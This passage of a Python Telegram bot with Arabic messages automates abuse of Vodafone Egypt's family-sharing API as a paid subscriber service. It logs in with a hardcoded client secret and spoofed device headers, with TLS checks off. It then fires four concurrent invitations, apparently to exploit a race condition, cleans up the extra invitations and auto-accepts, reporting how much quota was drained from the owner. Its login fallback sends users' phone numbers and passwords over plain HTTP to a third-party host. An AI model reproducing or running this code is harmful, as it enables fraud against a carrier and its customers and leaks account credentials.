    with _active_ops_lock:
        if active_operations:
            for uid, info in active_operations.items():
                ops_uids.append(uid)
                elapsed = int(time.time() - info["started_at"])
                mins, secs = divmod(elapsed, 60)
                owner_info = f" — المالك: `{info['owner']}`" if info.get("owner") else ""
                ops_lines.append((uid, f"  🔹 `{uid}`{owner_info}\n     الخدمة: {info['service']} — ⏱️ {mins}:{secs:02d}"))
        else:
            ops_lines.append((0, "  لا توجد عمليات نشطة حالياً"))
    _resolve_usernames_async(ops_uids)

    def _fmt(uid_val, line):
        if uid_val == 0:
            return line
        uname = _resolve_username(uid_val)
        uname_safe = uname.replace('_', '\\_')
        return line.replace(f"`{uid_val}`", f"@{uname_safe} (`{uid_val}`)")

    body = "\n\n".join(_fmt(u, l) for u, l in ops_lines)
    return "🔗 *العمليات النشطة*\n━━━━━━━━━━━━━━━━━━\n\n" + body

def admin_section_stats():
    """قسم الإحصائيات."""
    stats_lines = []
    total_ok = 0
    total_fail = 0
    for svc, v in stats.items():
        ok = v["success"]
        fail = v["fail"]
        total_ok += ok
        total_fail += fail
        bar = "█" * min(ok, 10)
        stats_lines.append(f"  ✅ *{svc}*: {ok} نجاح | {fail} فشل\n  `{bar}`")

    body = "\n\n".join(stats_lines) if stats_lines else "  لا توجد عمليات بعد"
    return (
        "📈 *الإحصائيات*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        + body
        + f"\n\n📌 الإجمالي: ✅ *{total_ok}* | ❌ *{total_fail}*"
    )

def admin_section_subscribers():
    """قسم المشتركين."""
    subs = get_subscribers_details()
    subs_lines = []
    star_subs_lines = []
    subs_uids = []
    for s in subs:
        subs_uids.append(s['user_id'])
        if s.get('sub_type') == 'stars':
            star_subs_lines.append((s['user_id'], f"  ⭐ `{s['user_id']}` — 🌟 {s.get('stars', 0)} نجمة"))
        else:
            days_info = f"📅 {s['expiry_days']} يوم" if s['expiry_days'] > 0 else "♾️ غير محدود"
            subs_lines.append((s['user_id'], f"  👤 `{s['user_id']}` — {days_info}"))
    _resolve_usernames_async(subs_uids)

    def _fmt(uid_val, line):
        if uid_val == 0:
            return line
        uname = _resolve_username(uid_val)
        uname_safe = uname.replace('_', '\\_')
        return line.replace(f"`{uid_val}`", f"@{uname_safe} (`{uid_val}`)")

    days_body = "\n".join(_fmt(u, l) for u, l in subs_lines) if subs_lines else "  لا يوجد مشتركون بأيام"
    stars_body = "\n".join(_fmt(u, l) for u, l in star_subs_lines) if star_subs_lines else "  لا يوجد مشتركون بنجوم"
    return (
        "👥 *المشتركون*\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📋 *بأيام:*\n{days_body}\n\n"
        f"⭐ *بنجوم:*\n{stars_body}"
    )

def admin_section_tracking():
    """قسم تتبع المستخدمين."""
    user_summaries = get_user_stats_summary()
    track_lines = []
    track_uids = []
    if user_summaries:
        for u in user_summaries[:20]:
            track_uids.append(u['user_id'])
            last = u['last_activity'][:16].replace("T", " ") if u['last_activity'] else "—"
            track_lines.append((u['user_id'], f"  📌 `{u['user_id']}` — ✅ {u['success']} نجاح | ❌ {u['fail']} فشل | آخر: {last}"))
    _resolve_usernames_async(track_uids)

    def _fmt(uid_val, line):
        if uid_val == 0:
            return line
        uname = _resolve_username(uid_val)
        uname_safe = uname.replace('_', '\\_')
        return line.replace(f"`{uid_val}`", f"@{uname_safe} (`{uid_val}`)")

    body = "\n".join(_fmt(u, l) for u, l in track_lines) if track_lines else "  لا توجد بيانات بعد"
    return "📋 *تتبع المستخدمين*\n━━━━━━━━━━━━━━━━━━━━\n\n" + body

# ════════════════════════════════════════════════════════════════
# 🌐 Network helpers — aiohttp + requests
# ════════════════════════════════════════════════════════════════
def _make_connector():
    return aiohttp.TCPConnector(limit=20, force_close=True, ssl=False)

def _proxy():
    return PROXY_URL if USE_PROXY else None

def login_user_via_api(number, password):
    """Login with direct API call, fallback to yassa-hany.com API."""
    encoded_number = quote(number, safe='')
    encoded_password = quote(password, safe='')
    payload = {
        "grant_type": "password", "username": number, "password": password,
        "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        "client_id": "ana-vodafone-app",
    }
    headers = {
        "User-Agent": "okhttp/4.11.0", "Accept": "application/json",
        "Accept-Encoding": "gzip", "silentLogin": "false",
        "x-agent-operatingsystem": "15", "Accept-Language": "ar",
        "x-agent-device": "HONOR ALI-NX1", "x-agent-version": "2025.11.1.1",
    }
    use_fallback = False
    try:
        proxies = {"http": PROXY_URL, "https": PROXY_URL} if USE_PROXY else None
        r = requests.post(AUTH_URL, data=payload, headers=headers, timeout=15, proxies=proxies, verify=False)
        result = r.json()
        if "access_token" in result:
            return True, result["access_token"]
        elif "token" in result:
            return True, result["token"]
        else:
            use_fallback = True
    except Exception:
        use_fallback = True

    if use_fallback:
        for attempt in range(3):
            fb_url = f"http://api.yassa-hany.com/voda_login?number={encoded_number}&password={encoded_password}&token=osama153"
            try:
                r = requests.get(fb_url, timeout=15)
                text = r.text.strip()
                if "token" in text.lower() or "success" in text.lower():
                    try:
                        data = r.json()
                        token = data.get('access_token') or data.get('token')
                        return True, token if token else text
                    except Exception:
                        return True, text
                if attempt < 2:
                    time.sleep(2)
            except Exception:
                if attempt < 2:
                    time.sleep(2)
        return False, "فشل تسجيل الدخول بعد 3 محاولات"
    return False, "فشل تسجيل الدخول"

def validate_credentials(number, password):
    """تحقق من صحة بيانات الدخول مباشرة من فودافون — بدون أي API بديل."""
    try:
        payload = {
            "grant_type": "password", "username": number, "password": password,
            "client_id": "ana-vodafone-app",
            "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        }
        headers_list = [
            {
                "User-Agent": "okhttp/4.11.0", "Accept": "application/json",
                "Accept-Encoding": "gzip", "silentLogin": "false",
                "x-agent-operatingsystem": "15", "Accept-Language": "ar",
                "x-agent-device": "HONOR ALI-NX1", "x-agent-version": "2025.11.1.1",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            {
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "okhttp/4.12.0", "Accept-Encoding": "gzip",
                "Connection": "keep-alive", "silentLogin": "true",
                "x-agent-operatingsystem": "13", "clientId": "AnaVodafoneAndroid",
                "Accept-Language": "en", "x-agent-device": "Xiaomi M2102J20SG",
                "x-agent-version": "2025.11.1", "x-agent-build": "1063",
                "digitalId": "244BQYOGFM0IM", "device-id": "b83aab2d8fa633da",
                "Host": "mobile.vodafone.com.eg",
            },
        ]
        proxies = {"http": PROXY_URL, "https": PROXY_URL} if USE_PROXY else None

        for hdrs in headers_list:
            try:
                r = requests.post(AUTH_URL, data=payload, headers=hdrs, timeout=15, proxies=proxies, verify=False)
                if r.status_code == 200:
                    result = r.json()
                    tok = result.get("access_token") or result.get("token")
                    if tok:
                        return True, "✅ البيانات صحيحة"
                # فشل — جيب سبب الخطأ من رد فودافون
                try:
                    err_data = r.json()
                    err_desc = err_data.get("error_description", "")
                    err_code = err_data.get("error", "")
                    if err_desc or err_code:
                        return False, f"❌ فشل تسجيل الدخول\n📌 {err_desc or err_code}"
                except Exception:
                    pass
                return False, f"❌ فشل تسجيل الدخول (HTTP {r.status_code})"
            except requests.exceptions.ConnectionError:
                continue
            except requests.exceptions.Timeout:
                continue
            except Exception:
                continue

        return False, "❌ فشل الاتصال بسيرفر فودافون"
    except Exception as e:
        return False, f"❌ خطأ: {e}"

def get_owner_percentage(number, password):
    try:
        success, token = login_user_via_api(number, password)
        if not success:
            return None
        url = "https://mobile.vodafone.com.eg/services/dxl/usage/usageConsumptionReport"
        params = {'@type': "aggregated", 'bucket.product.publicIdentifier': number}
        headers = {
            'User-Agent': "okhttp/4.12.0", 'Connection': "Keep-Alive",
            'Accept': "application/json", 'Accept-Encoding': "gzip",
            'api-host': "usageConsumptionHost", 'useCase': "aggregated",
            'Authorization': f"Bearer {token}", 'api-version': "v2",
            'device-id': "b83a", 'x-agent-operatingsystem': "13",
            'clientId': "AnaVodafoneAndroid", 'x-agent-device': "Xiaomi",
            'x-agent-version': "2026.2.3", 'x-agent-build': "1117",
            'msisdn': number, 'Content-Type': "application/json", 'Accept-Language': "en",
        }
        proxies = {"http": PROXY_URL, "https": PROXY_URL} if USE_PROXY else None
        r = requests.get(url, params=params, headers=headers, timeout=15, proxies=proxies, verify=False)
        data = r.json()
        for item in data:
            if "bucket" in item and isinstance(item["bucket"], list):
                for bi in item["bucket"]:
                    if bi.get("usageType") == "limit":
                        bl = bi.get("bucketBalance", [])
                        if bl:
                            return bl[0].get("remainingValue", {}).get("amount")
        return None
    except Exception as e:
        print(f"[PERCENTAGE] Error: {e}")
        return None

async def _login_one(session, number, password):
    creds = {
        "grant_type": "password", "username": number, "password": password,
        "client_id": "ana-vodafone-app",
        "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
    }
    headers_list = [
        {
            "User-Agent": "okhttp/4.11.0", "Accept": "application/json",
            "Accept-Encoding": "gzip", "silentLogin": "false",
            "x-agent-operatingsystem": "15", "Accept-Language": "ar",
            "x-agent-device": "HONOR ALI-NX1", "x-agent-version": "2025.11.1.1",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/4.12.0", "Accept-Encoding": "gzip",
            "Connection": "keep-alive", "silentLogin": "true",
            "x-agent-operatingsystem": "13", "clientId": "AnaVodafoneAndroid",
            "Accept-Language": "en", "x-agent-device": "Xiaomi M2102J20SG",
            "x-agent-version": "2025.11.1", "x-agent-build": "1063",
            "digitalId": "244BQYOGFM0IM", "device-id": "b83aab2d8fa633da",
            "Host": "mobile.vodafone.com.eg",
        },
    ]
    for hdrs in headers_list:
        try:
            async with session.post(AUTH_URL, data=creds, headers=hdrs,
                                     timeout=aiohttp.ClientTimeout(total=20), proxy=_proxy()) as r:
                if r.status == 200:
                    j = await r.json(content_type=None)
                    tok = j.get("access_token") or j.get("token")
                    if tok:
                        return tok
        except Exception:
            pass
    return None

async def get_tokens(session, number, password, count=4, max_rounds=8):
    valid = []
    for i in range(count):
        tok = await _login_one(session, number, password)
        if not tok:
            tok = await _login_one(session, number, password)
        if tok:
            valid.append(tok)
        if i < count - 1 and len(valid) < count:
            await asyncio.sleep(0.8)
    extra = 0
    while len(valid) < count and extra < max_rounds:
        needed = count - len(valid)
        for i in range(needed):
            tok = await _login_one(session, number, password)
            if tok:
                valid.append(tok)
                if len(valid) >= count:
                    break
            if i < needed - 1:
                await asyncio.sleep(0.8)
        extra += 1
        if len(valid) < count:
            await asyncio.sleep(2)
    return valid[:count]

async def add_family_member_async(session, access_token, owner, member, pct, thread_id, attempt_num, stop_ev):
    """Send a single family invitation. Returns (success, status, msg, thread_id)."""
    if stop_ev and stop_ev.is_set():
        return False, 0, "تم الإيقاف", thread_id
    payload = json.dumps({
        "name": "FlexFamily", "type": "SendInvitation",
        "category": [
            {"value": "523", "listHierarchyId": "PackageID"},
            {"value": "47", "listHierarchyId": "TemplateID"},
            {"value": "523", "listHierarchyId": "TierID"},
            {"value": "percentage", "listHierarchyId": "familybehavior"},
        ],
        "parts": {
            "member": [
                {"id": [{"value": owner, "schemeName": "MSISDN"}], "type": "Owner"},
                {"id": [{"value": member, "schemeName": "MSISDN"}], "type": "Member"},
            ],
            "characteristicsValue": {
                "characteristicsValue": [
                    {"characteristicName": "quotaDist1", "value": str(pct), "type": "percentage"}
                ]
            },
        },
    })
    headers = {
        'User-Agent': random.choice(USER_AGENTS_APPLE),
        'Accept': "application/json",
        'Content-Type': "application/json",
        'Authorization': f"Bearer {access_token}",
        'msisdn': owner,
        'clientId': "WebsiteConsumer",
        'Origin': "https://web.vodafone.com.eg",
        'Referer': "https://web.vodafone.com.eg/spa/familySharing",
        'X-Request-ID': f"{thread_id}-{attempt_num}-{random.randint(1000, 9999)}",
    }
    try:
        async with session.post(WEB_FAMILY_URL, data=payload, headers=headers,
                                 timeout=aiohttp.ClientTimeout(total=45), proxy=_proxy()) as response:
            if stop_ev and stop_ev.is_set():
                return False, 0, "تم الإيقاف", thread_id
            if response.status in [200, 201, 204]:
                print(f"[SEND_INV] ✅ status={response.status} owner={owner} member={member} thread={thread_id}")
                return True, response.status, "تم بنجاح", thread_id
            else:
                try:
                    err = await response.json()
                    err_msg = json.dumps(err, ensure_ascii=False)[:200]
                except Exception:
                    err_msg = (await response.text())[:200]
                print(f"[SEND_INV] ⚠️ status={response.status} owner={owner} member={member} err={err_msg[:100]}")
                return False, response.status, err_msg, thread_id
    except Exception as e:
        print(f"[SEND_INV] ❌ Exception: {e} owner={owner} member={member}")
        return False, 0, str(e), thread_id

async def send_4_inv(session, tokens, owner, member, pct, attempt_num, stop_ev):
    """Send 4 concurrent invitations. Returns (successful_list, failed_list).
    successful_list: [(thread_id, status), ...]
    failed_list: [(thread_id, status, msg), ...]
    """
    tasks = [
        add_family_member_async(session, tokens[i], owner, member, pct, i + 1, attempt_num, stop_ev)
        for i in range(min(4, len(tokens)))
    ]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    successful, failed = [], []
    for i, result in enumerate(results):
        if isinstance(result, Exception):
            failed.append((i + 1, 0, str(result)))
        else:
            ok, status, msg, tid = result
            if ok:
                successful.append((tid, status))
            else:
                failed.append((tid, status, msg))
    print(f"[SEND_4_INV] owner={owner} member={member} successful={len(successful)} failed={len(failed)}")
    return successful, failed

async def remove_family_member_with_retry_async(session, owner, owner_pass, member, stop_ev):
    """Remove family member with retry and fresh token each attempt.
    Returns (success, attempt_count). Max 8 attempts to prevent infinite hang.
    """
    MAX_REMOVE_ATTEMPTS = 8
    attempt = 1
    while attempt <= MAX_REMOVE_ATTEMPTS:
        if stop_ev and stop_ev.is_set():
            return False, attempt
        owner_tokens = await get_tokens(session, owner, owner_pass, 1, max_rounds=3)
        if not owner_tokens or not owner_tokens[0]:
            await asyncio.sleep(10)
            attempt += 1
            continue
        access_token = owner_tokens[0]
        payload = {
            "name": "FlexFamily", "type": "FamilyRemoveMember",
            "category": [{"value": "47", "listHierarchyId": "TemplateID"}],
            "parts": {
                "member": [
                    {"id": [{"value": owner, "schemeName": "MSISDN"}], "type": "Owner"},
                    {"id": [{"value": member, "schemeName": "MSISDN"}], "type": "Member"}
                ],
                "characteristicsValue": {
                    "characteristicsValue": [
                        {"characteristicName": "Disconnect", "value": "0"},
                        {"characteristicName": "LastMemberDeletion", "value": "1"}
                    ]
                }
            }
        }
        headers = {
            'Authorization': f"Bearer {access_token}",
            'Content-Type': "application/json",
            'msisdn': owner,
            'User-Agent': random.choice(USER_AGENTS_APPLE),
            'Accept': "application/json",
            'clientId': "WebsiteConsumer",
            'Origin': "https://web.vodafone.com.eg",
            'Referer': "https://web.vodafone.com.eg/spa/familySharing",
        }
        try:
            async with session.patch(WEB_FAMILY_URL, json=payload, headers=headers,
                                     timeout=aiohttp.ClientTimeout(total=30), proxy=_proxy()) as response:
                if response.status in [200, 201, 204, 404]:
                    print(f"[REMOVE_MEMBER] ✅ status={response.status} owner={owner} member={member} attempt={attempt}")
                    return True, attempt
                print(f"[REMOVE_MEMBER] ⚠️ status={response.status} owner={owner} member={member} attempt={attempt}")
                await asyncio.sleep(10)
                attempt += 1
        except Exception as e:
            print(f"[REMOVE_MEMBER] ❌ Exception: {e} owner={owner} member={member} attempt={attempt}")
            await asyncio.sleep(10)
            attempt += 1
    # استنفدنا MAX_REMOVE_ATTEMPTS محاولة بدون نجاح
    print(f"[REMOVE_MEMBER] ⚠️ Max attempts ({MAX_REMOVE_ATTEMPTS}) reached — giving up. owner={owner} member={member}")
    return False, attempt

async def cleanup_pending_invitations_with_retry(session, owner, owner_pass, member, successful_threads, stop_ev):
    """Cleanup pending invitations for each successful thread.
    Returns [(thread_id, ok, attempts), ...].
    """
    results = []
    for thread_id, _ in successful_threads:
        if stop_ev and stop_ev.is_set():
            break
        ok, attempts = await remove_family_member_with_retry_async(session, owner, owner_pass, member, stop_ev)
        results.append((thread_id, ok, attempts))
        await asyncio.sleep(2)
    return results

async def accept_inv_auto(session, owner, member_num, member_pass, uid, stop_ev):
    if stop_ev.is_set():
        return False
    tok = await _login_one(session, member_num, member_pass)
    if not tok:
        safe_send(uid, "❌ فشل تسجيل دخول الفرد")
        return False
    await asyncio.sleep(2)
    payload = {
        "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
        "name": "FlexFamily",
        "parts": {
            "member": [
                {"id": [{"schemeName": "MSISDN", "value": owner}], "type": "Owner"},
                {"id": [{"schemeName": "MSISDN", "value": member_num}], "type": "Member"},
            ]
        },
        "type": "AcceptInvitation",
    }
    headers = {
        "User-Agent": "okhttp/4.11.0", "Connection": "Keep-Alive",
        "Accept": "application/json", "Accept-Encoding": "gzip",
        "Content-Type": "application/json", "api_id": "APP",
        "Authorization": f"Bearer {tok}", "api-version": "v2",
        "x-agent-operatingsystem": "13", "clientId": "AnaVodafoneAndroid",
        "x-agent-device": "Xiaomi M2101K7BG", "x-agent-version": "2026.2.1",
        "x-agent-build": "1200", "msisdn": member_num, "Accept-Language": "ar",
    }
    try:
        async with session.patch(MOBILE_URL, json=payload, headers=headers,
                                  timeout=aiohttp.ClientTimeout(total=30), proxy=_proxy()) as r:
            status = r.status
            print(f"[ACCEPT_INV] status={status} owner={owner} member={member_num}")
            # 2xx = نجاح واضح
            if 200 <= status < 300:
                return True
            # 409 = مقبول بالفعل = نجاح
            if status == 409:
                print(f"[ACCEPT_INV] ✅ 409 (already accepted) owner={owner} member={member_num}")
                return True
            # قراءة محتوى الرد
            try:
                body = await r.text()
                print(f"[ACCEPT_INV] body={body[:300]}")
                body_lower = body.lower()
                if '"status":"success"' in body_lower or '"status": "success"' in body_lower:
                    return True
                if 'already' in body_lower and ('accept' in body_lower or 'member' in body_lower):
                    print(f"[ACCEPT_INV] ✅ already accepted (body)")
                    return True
            except Exception:
                pass
            return False
    except Exception as e:
        print(f"[ACCEPT_INV] ❌ Exception: {e} owner={owner} member={member_num}")
        return False

async def accept_inv_with_confirm(session, owner, member_num, member_pass, uid, stop_ev):
    if stop_ev.is_set():
        return False
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("✅ نعم، أقبل", callback_data=f"acc_yes_{uid}"),
        types.InlineKeyboardButton("❌ لا، تخطّ", callback_data=f"acc_no_{uid}"),
    )
    safe_send(uid, f"❓ هل تريد قبول الدعوة للرقم `{member_num}`؟",
              parse_mode="Markdown", reply_markup=markup)
    for _ in range(90):
        if stop_ev.is_set():
            return False
        val = pop_accept_resp(uid)
        if val is not None:
            if not val:
                safe_send(uid, "🚫 تم تخطي القبول.")
                return False
            break
        await asyncio.sleep(1)
    else:
        safe_send(uid, "⏰ انتهى وقت الانتظار.")
        return False
    return await accept_inv_auto(session, owner, member_num, member_pass, uid, stop_ev)

async def change_pct(session, token, owner, member, pct_val, uid, stop_ev, step):
    payload = {
        "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
        "createdBy": {"value": "MobileApp"},
        "parts": {
            "characteristicsValue": {
                "characteristicsValue": [
                    {"characteristicName": "quotaDist1", "type": "percentage", "value": str(pct_val)}
                ]
            },
            "member": [
                {"id": [{"schemeName": "MSISDN", "value": owner}], "type": "Owner"},
                {"id": [{"schemeName": "MSISDN", "value": member}], "type": "Member"},
            ],
        },
        "type": "QuotaRedistribution",
    }
    headers = {
        "Authorization": f"Bearer {token}", "Content-Type": "application/json",
        "Accept": "application/json", "api-version": "v2",
        "msisdn": owner, "clientId": "AnaVodafoneAndroid",
        "User-Agent": "okhttp/4.11.0", "Accept-Language": "ar",
    }
    while not stop_ev.is_set():
        try:
            async with session.patch(MOBILE_URL, json=payload, headers=headers,
                                      timeout=aiohttp.ClientTimeout(total=15), proxy=_proxy()) as r:
                status = r.status
                print(f"[CHANGE_PCT] status={status} owner={owner} member={member} pct={pct_val} step={step}")
                if 200 <= status < 300:
                    return True
                # 409 = تم التغيير بالفعل
                if status == 409:
                    print(f"[CHANGE_PCT] ✅ 409 (already set) step={step}")
                    return True
                try:
                    body = await r.text()
                    print(f"[CHANGE_PCT] body={body[:200]}")
                    body_lower = body.lower()
                    if '"status":"success"' in body_lower or '"status": "success"' in body_lower:
                        return True
                except Exception:
                    pass
        except Exception as e:
            print(f"[CHANGE_PCT] ❌ Exception: {e} step={step}")
        retry = await ask_retry(uid, step, stop_ev)
        if retry is False:
            return False
        if retry == "skip":
            return "skip"
    return False

async def ask_retry(uid, step, stop_ev):
    if stop_ev.is_set():
        return False
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("🔄 إعادة المحاولة", callback_data=f"retry_yes_{uid}"),
        types.InlineKeyboardButton("⏭️ تخطي", callback_data=f"skip_yes_{uid}"),
        types.InlineKeyboardButton("🛑 إيقاف", callback_data=f"retry_no_{uid}"),
    )
    safe_send(uid, f"⚠️ *فشل إتمام الخطوة {step}*\n\nهل تريد إعادة المحاولة أو تخطي؟",
              parse_mode="Markdown", reply_markup=markup)
    for _ in range(300):
        if stop_ev.is_set():
            return False
        r = pop_retry_resp(uid)
        if r is not None:
            return "skip" if r == "skip" else r
        s = pop_skip_resp(uid)
        if s is not None:
            return "skip"
        await asyncio.sleep(1)
    safe_send(uid, "⏰ انتهى وقت الانتظار.")
    return False

async def interruptible_sleep(sec, stop_ev):
    for _ in range(sec):
        if stop_ev.is_set():
            return True
        await asyncio.sleep(1)
    return False

# ════════════════════════════════════════════════════════════════
# 🚀 Service: تطيير فردي (Single Fly)
# ════════════════════════════════════════════════════════════════
async def _run_fly_single(owner, owner_pass, member, member_pass, pct, pct_lbl, uid):
    MAX_ATTEMPTS = 10
    stop_ev = get_user_stop_event(uid)
    stop_ev.clear()
    start_op(uid, "تطيير فردي", owner)
    init_progress(uid, "تطيير فردي", ["تسجيل الدخول", "إرسال الدعوات", "قبول الدعوة"])
    set_progress(uid, "تسجيل الدخول", "running")

    stop_markup = types.InlineKeyboardMarkup()
    stop_markup.add(types.InlineKeyboardButton("🛑 إيقاف العملية", callback_data="stop_fly"))

    # جلب نسبة المالك قبل التطيير
    owner_pct_before = get_owner_percentage(owner, owner_pass)
    pct_before_str = f"{owner_pct_before}" if owner_pct_before is not None else "غير متاح"

    status_msg = safe_send(uid,
        f"🔄 *جاري التطيير...*\n\n👤 المالك: `{owner}`\n👥 الفرد: `{member}`\n📊 النسبة: {pct_lbl}\n📊 نسبة المالك الحالية: `{pct_before_str}`",
        parse_mode="Markdown", reply_markup=stop_markup)
    status_mid = status_msg.message_id if status_msg else None

    def upd(text):
        nonlocal status_mid
        if status_mid:
            try:
                bot.edit_message_text(text, uid, status_mid, parse_mode="Markdown", reply_markup=stop_markup)
                return
            except Exception:
                pass
        msg = safe_send(uid, text, parse_mode="Markdown", reply_markup=stop_markup)
        if msg:
            status_mid = msg.message_id

    connector = _make_connector()
    try:
        async with aiohttp.ClientSession(connector=connector) as session:
            upd(f"🔍 *التحقق من بيانات الدخول...*\n\n👤 المالك: `{owner}`\n👥 الفرد: `{member}`\n📊 نسبة المالك: `{pct_before_str}`")
            owner_tok = await _login_one(session, owner, owner_pass)
            member_tok = await _login_one(session, member, member_pass)
            if not owner_tok:
                upd("❌ *فشل تسجيل دخول المالك*\n\nتحقق من الرقم وكلمة السر.")
                set_progress(uid, "تسجيل الدخول", "fail")
                record("تطيير فردي", False, uid)
                return
            if not member_tok:
                upd("❌ *فشل تسجيل دخول الفرد*\n\nتحقق من الرقم وكلمة السر.")
                set_progress(uid, "تسجيل الدخول", "fail")
                record("تطيير فردي", False, uid)
                return

            set_progress(uid, "تسجيل الدخول", "done")
            set_progress(uid, "إرسال الدعوات", "running")

            upd(f"✅ *البيانات صحيحة — جاري الإرسال...*\n\n👤 المالك: `{owner}`\n👥 الفرد: `{member}`\n📊 النسبة: {pct_lbl}")

            total_successful = 0
            attempt = 1

            while total_successful < 2 and attempt <= MAX_ATTEMPTS and not stop_ev.is_set():
                upd(f"⏳ *جولة {attempt}/{MAX_ATTEMPTS}* — جاري الحصول على 4 توكنات...\n\n👤 المالك: `{owner}` | 👥 الفرد: `{member}`\n📊 نسبة المالك: `{pct_before_str}`")
                tokens = await get_tokens(session, owner, owner_pass, 4)
                if stop_ev.is_set():
                    upd("🛑 *تم إيقاف العملية.*\n\nاضغط /start لعملية جديدة.")
                    safe_send(uid, "اضغط /start للمتابعة.", reply_markup=main_kb(uid))
                    set_progress(uid, "إرسال الدعوات", "fail")
                    record("تطيير فردي", False, uid)
                    return

                if len(tokens) < 4:
                    upd(f"⚠️ *جولة {attempt}/{MAX_ATTEMPTS}* — فشل الحصول على التوكنات. هنعيد.")
                    await asyncio.sleep(10)
                    attempt += 1
                    continue

                upd(f"📨 *جولة {attempt}/{MAX_ATTEMPTS}* — إرسال 4 دعوات...\n\n👤 المالك: `{owner}` | 👥 الفرد: `{member}`")
                await asyncio.sleep(DELAY_AFTER_LOGIN)

                successful, failed = await send_4_inv(session, tokens, owner, member, pct, attempt, stop_ev)
                if stop_ev.is_set():
                    upd("🛑 *تم إيقاف العملية.*\n\nاضغط /start لعملية جديدة.")
                    safe_send(uid, "اضغط /start للمتابعة.", reply_markup=main_kb(uid))
                    set_progress(uid, "إرسال الدعوات", "fail")
                    record("تطيير فردي", False, uid)
                    return

                new_ok = len(successful)
                total_successful += new_ok

                # عرض النتائج
                ok_tids = [tid for tid, _ in successful]
                fail_tids = [tid for tid, _, _ in failed]
                all_tids = ok_tids + fail_tids
                lines = "".join(f"  {'✅' if t in ok_tids else '❌'} طلب {t}\n" for t in sorted(all_tids))
                upd(f"📊 *جولة {attempt}/{MAX_ATTEMPTS}:*\n{lines}نجح: *{new_ok}/4*\n\n👤 `{owner}` | 👥 `{member}`")

                if total_successful >= 2:
                    break

                if new_ok > 0:
                    upd(f"🔄 *جولة {attempt}:* نجحت {new_ok} دعوة — جاري تنظيف الدعوات المعلقة...")
                    cleanup = await cleanup_pending_invitations_with_retry(
                        session, owner, owner_pass, member, successful, stop_ev
                    )
                    if stop_ev.is_set():
                        upd("🛑 *تم إيقاف العملية.*\n\nاضغط /start لعملية جديدة.")
                        safe_send(uid, "اضغط /start للمتابعة.", reply_markup=main_kb(uid))
                        set_progress(uid, "إرسال الدعوات", "fail")
                        record("تطيير فردي", False, uid)
                        return
                    if all(r[1] for r in cleanup):
                        total_successful = 0
                        upd(f"🧹 *جولة {attempt}:* تم تنظيف الدعوات.")
                    else:
                        upd(f"⚠️ *جولة {attempt}:* فشل تنظيف بعض الدعوات.")

                upd(f"⏳ *جولة {attempt}/{MAX_ATTEMPTS}:* انتظار {DELAY_BETWEEN_RETRIES} ثانية...\nاضغط 🛑 للإيقاف.")
                if await interruptible_sleep(DELAY_BETWEEN_RETRIES, stop_ev):
                    upd("🛑 *تم إيقاف العملية.*\n\nاضغط /start لعملية جديدة.")
                    safe_send(uid, "اضغط /start للمتابعة.", reply_markup=main_kb(uid))
                    set_progress(uid, "إرسال الدعوات", "fail")
                    record("تطيير فردي", False, uid)
                    return
                attempt += 1

            if stop_ev.is_set():
                upd("🛑 *تم إيقاف العملية.*\n\nاضغط /start لعملية جديدة.")
                safe_send(uid, "اضغط /start للمتابعة.", reply_markup=main_kb(uid))
                set_progress(uid, "إرسال الدعوات", "fail")
                record("تطيير فردي", False, uid)
                return

            if total_successful < 2:
                upd(f"❌ *فشلت العملية بعد {MAX_ATTEMPTS} محاولة.*\n\n👤 `{owner}` | 👥 `{member}`\n\nاضغط /start لعملية جديدة.")
                safe_send(uid, "اضغط /start للمتابعة.", reply_markup=main_kb(uid))
                set_progress(uid, "إرسال الدعوات", "fail")
                record("تطيير فردي", False, uid)
                return

            set_progress(uid, "إرسال الدعوات", "done")
            set_progress(uid, "قبول الدعوة", "running")

            upd("⏳ *نجحت الدعوات!* انتظار 10 ثواني قبل القبول...")
            if await interruptible_sleep(10, stop_ev):
                upd("🛑 تم الإيقاف قبل القبول.")
                safe_send(uid, "اضغط /start للمتابعة.", reply_markup=main_kb(uid))
                return

            try:
                bot.edit_message_reply_markup(uid, status_mid, reply_markup=None)
            except Exception:
                pass

            accepted = await accept_inv_with_confirm(session, owner, member, member_pass, uid, stop_ev)
            set_progress(uid, "قبول الدعوة", "done" if accepted else "fail")
            record("تطيير فردي", accepted, uid)
            if accepted:
                # جلب نسبة المالك بعد القبول
                owner_pct_after = get_owner_percentage(owner, owner_pass)
                pct_after_str = f"{owner_pct_after}" if owner_pct_after is not None else "غير متاح"
                deducted = ""
                if owner_pct_before is not None and owner_pct_after is not None:
                    diff = owner_pct_before - owner_pct_after
                    deducted = f" (تم خصم {diff})"
                safe_send(uid,
                    f"🎉 *اكتملت العملية بنجاح!*\n\n👤 المالك: `{owner}`\n👥 الفرد: `{member}`\n📊 النسبة: {pct_lbl}\n📉 نسبة المالك بعد التطيير: `{pct_after_str}`{deducted}\n\nاضغط /start لعملية جديدة.",
                    parse_mode="Markdown", reply_markup=main_kb(uid))
            else:
                safe_send(uid,
                    f"⚠️ *نجحت الدعوات لكن لم يتم قبولها.*\n\n👤 `{owner}` | 👥 `{member}`\n\nاضغط /start لعملية جديدة.",
                    parse_mode="Markdown", reply_markup=main_kb(uid))
    except Exception as e:
        safe_send(uid, f"❌ خطأ غير متوقع: {e}")
        set_progress(uid, "إرسال الدعوات", "fail")
        record("تطيير فردي", False, uid)
        print(traceback.format_exc())
    finally:
        pop_user_stop_event(uid)
        end_op(uid)
        clear_progress(uid)

def fly_single_thread(owner, owner_pass, member, member_pass, pct, pct_lbl, uid):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(_run_fly_single(owner, owner_pass, member, member_pass, pct, pct_lbl, uid))
    finally:
        loop.close()

